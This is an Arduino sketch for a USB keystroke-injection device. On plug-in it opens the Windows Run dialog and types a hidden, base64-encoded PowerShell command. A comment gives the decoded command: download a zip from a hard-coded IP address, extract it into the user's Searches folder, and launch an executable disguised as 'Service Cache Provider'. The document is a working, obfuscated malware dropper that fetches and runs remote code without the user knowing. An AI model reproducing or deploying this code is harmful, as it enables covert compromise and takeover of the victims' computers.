#include <Arduino.h>
#include <Keyboard.h>

/*
$zip="$env:TEMP\scp.zip";$dest="$env:USERPROFILE\Searches";Invoke-WebRequest -Uri "http://209.38.37.11" -OutFile $zip;Expand-Archive -Path $zip -DestinationPath $dest -Force;Remove-Item $zip;Start-Process -FilePath (Join-Path $dest "Service Cache Provider\Service Cache Provider.exe");exit

$cmd = '...'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
*/

const char encoded[] PROGMEM = "JAB6AGkAcAA9ACIAJABlAG4AdgA6AFQARQBNAFAAXABzAGMAcAAuAHoAaQBwACIAOwAkAGQAZQBzAHQAPQAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABTAGUAYQByAGMAaABlAHMAIgA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAOgAvAC8AMgAwADkALgAzADgALgAzADcALgAxADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACQAegBpAHAAOwBFAHgAcABhAG4AZAAtAEEAcgBjAGgAaQB2AGUAIAAtAFAAYQB0AGgAIAAkAHoAaQBwACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AUABhAHQAaAAgACQAZABlAHMAdAAgAC0ARgBvAHIAYwBlADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJAB6AGkAcAA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACgASgBvAGkAbgAtAFAAYQB0AGgAIAAkAGQAZQBzAHQAIAAiAFMAZQByAHYAaQBjAGUAIABDAGEAYwBoAGUAIABQAHIAbwB2AGkAZABlAHIAXABTAGUAcgB2AGkAYwBlACAAQwBhAGMAaABlACAAUAByAG8AdgBpAGQAZQByAC4AZQB4AGUAIgApADsAZQB4AGkAdAA=";

void typeFromProgmem(const char *p) {
	for (uint16_t i = 0; ; ++i) {
		char c = (char)pgm_read_byte_near(p + i);
		if (c == 0) 
		break;

		Keyboard.write(c);
	}
}

void setup() {
	delay(2000);
	Keyboard.begin();

	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press('r');
	Keyboard.releaseAll();
	delay(2000);

	Keyboard.print("powershell");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	delay(3000);

	Keyboard.print("powershell -w hidden -EncodedCommand ");
	typeFromProgmem(encoded);
	Keyboard.print(";exit");
	delay(300);

	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();

	delay(1000);
	Keyboard.end();
}

void loop() {
	delay(1000);
}
